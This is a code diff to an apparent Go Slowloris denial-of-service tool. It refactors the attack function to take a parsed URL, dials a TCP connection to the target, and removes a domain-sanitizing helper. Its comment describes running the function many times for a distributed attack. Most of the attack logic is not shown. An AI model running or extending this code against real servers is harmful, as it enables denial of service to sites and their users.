@@ -11,7 +11,12 @@ import (
 
 // Slowloris performs single threaded slow loris attack. If you want to run distributed
 // attack, just run multiple calls of the function over the same URL.
-func Slowloris(ctx context.Context, index int64, interval time.Duration, host string) error {
+func Slowloris(ctx context.Context, index int64, interval time.Duration, url *url.URL) error {
+	host := url.Host
+	if !strings.Contains(host, ":") {
+		host = fmt.Sprintf("%s:%s", url.Host, url.Port())
+	}
+
 	conn, err := net.Dial("tcp", host)
 	if err != nil {
 		return err
@@ -55,18 +60,4 @@ func RandomHeader() string {
 // ClosingLine sends a closing line for a HTTP request
 func ClosingLine() string {
 	return "\r\n"
-}
-
-// SanitizeDomain extracts the host from the URL
-func SanitizeDomain(rawURL string) (string, error) {
-	parsed, err := url.Parse(rawURL)
-	if err != nil {
-		return "", err
-	}
-
-	if !strings.Contains(parsed.Host, ":") {
-		return fmt.Sprintf("%s:%s", parsed.Host, parsed.Port()), nil
-	}
-
-	return parsed.Host, nil
 }
